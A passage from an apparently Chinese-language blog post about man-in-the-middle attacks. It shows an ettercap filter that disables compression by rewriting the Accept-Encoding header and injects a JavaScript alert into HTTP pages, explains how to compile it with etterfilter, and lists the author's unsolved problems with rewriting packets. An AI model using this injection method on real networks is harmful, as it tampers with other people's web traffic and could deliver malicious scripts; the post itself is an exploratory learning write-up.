        replace("Accept-Encoding", "Accept-Rubbish!");
        msg("zapped Accept-Encoding!\n");
    }
}

if (ip.proto == TCP && tcp.src == 80)
{
    replace("<head>", "<head><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
    replace("<HEAD>", "<HEAD><script type=\"text/javascript\">alert('Big brother is watching at you');</script>");
    msg("Injecting OK!!\n");
}
```

这里是一个例子，我来解释一下：

* search是用来寻找某个字符串
* replace很简单，就是直接替换字符串，这里我们可以插入JS
* msg打印信息

我们需要讲这个脚本保持为`test.filter`，随后用ettercap编译。

`etterfilter test.filter -o test.ef`

编译后的.ef文件就可以拿来进行篡改数据包了。

ettercap十分强大，仍然有许多功能，这里就不找教程了，需要的Google吧。

## 尚未实现...

中间人攻击的基本内容就是这些，但是仍然没有实现修改报文的内容，插入JS，事实上这部分也是最好玩的。

我个人目前遇到的问题，思考的内容如下：

* 尝试过libpcap，前面讲过在转发的过程中遇到一些问题，效率也不高。
* 尝试过libnet，在构造数据包的时候，让系统填充校验和，至于序列号和确认号不做处理，转发。结果是可以发送成功，浏览器并没有加载。
* 尝试过raw Socket，浏览器同样没有接收，感觉是这个应该要有专门的接收函数或者是识别的地方？
* 是否处理好校验和计算算法就好了呢？别的地方不需要修改吗？
* 初步判定HTTP头部中记载的数据会影响到最后加载的结果。
* 网上的说法基本上都是从内核层面改造，利用netfilter框架修改数据包，内核层面可以修改确实好理解，那么应用层修改为什么会出现问题呢？
* 关于序列号和确认号，他们会在每次修改后增加上一次的偏移量，但是一旦出现中间某个包发生丢失，而那个包中含有要修改的地方，此后所有包的这两个数据均会发生错误，这一点在现在高丢包率的网络中是比较复杂的。

希望能和有看到这里的有进一步想法的各路大佬一起思考一下，欢迎评论（要翻墙），或者发送至我的邮箱`zxc479773533@gmail.com`。